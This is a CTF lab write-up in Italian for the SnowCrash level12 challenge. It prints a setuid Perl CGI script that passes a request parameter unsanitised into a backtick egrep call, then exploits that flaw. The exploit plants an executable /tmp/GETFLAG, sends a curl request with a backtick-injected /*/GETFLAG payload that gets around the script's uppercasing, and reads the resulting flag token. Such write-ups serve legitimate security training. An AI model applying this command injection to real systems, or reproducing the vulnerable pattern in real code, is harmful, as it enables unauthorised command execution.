# Level12
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
troviamo uno script perl con al suo interno il seguente codice:
```perl
     1  #!/usr/bin/env perl
     2  # localhost:4646
     3  use CGI qw{param};
     4  print "Content-type: text/html\n\n";
     5  sub t {
     6    $nn = $_[1];
     7    $xx = $_[0];
     8    $xx =~ tr/a-z/A-Z/;
     9    $xx =~ s/\s.*//;
    10    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    11    foreach $line (@output) {
    12        ($f, $s) = split(/:/, $line);
    13        if($s =~ $nn) {
    14            return 1;
    15        }
    16    }
    17    return 0;
    18  }
    19  sub n {
    20    if($_[0] == 1) {
    21        print("..");
    22    } else {
    23        print(".");
    24    }
    25  }
    26  n(t(param("x"), param("y")));
```
Il contenuto della variabile `x` viene trasformato in maiuscolo tramite `$xx =~ tr/a-z/A-Z/;`,
successivamente viene salvato tutto ciò che si trova dopo uno spazio con `$xx =~ s/\s.*//;` e
in fine viene passato a `egrep`, in più notiamo che questo script è già in ascolto sulla porta
`4646` come suggerito nel primo commento.

### 2 passaggio:
Come prima cosa bisogna bypassare la prima regex, dunque creiamo un file dentro la cartella `tmp`
con il nome in maiuscolo e gli diamo i permessi di esecuzione, mentre al suo interno metteremo un
semplice script per inserire l'output di `getflag` in un file:
```bash
echo "getflag > /tmp/flag" > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```
ma ovviamente non possiamo passare il file `/tmp/GETFLAG` allo script perchè verrebbe trasformato in
`/TMP/GETFLAG` e ovviamente non esiste nulla in `TMP` dunque bisogna sfruttare l'espansione `*` scrivendo il percorso nel seguente modo: `/*/GETFLAG`

### 3 passaggio:
Adesso basta fare una semplice richiesta con `curl` e poi stampare il contenuto del file creato:
```bash
level12@SnowCrash:~$ curl '127.00.0.1:4646?x="`/*/GETFLAG`"'
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
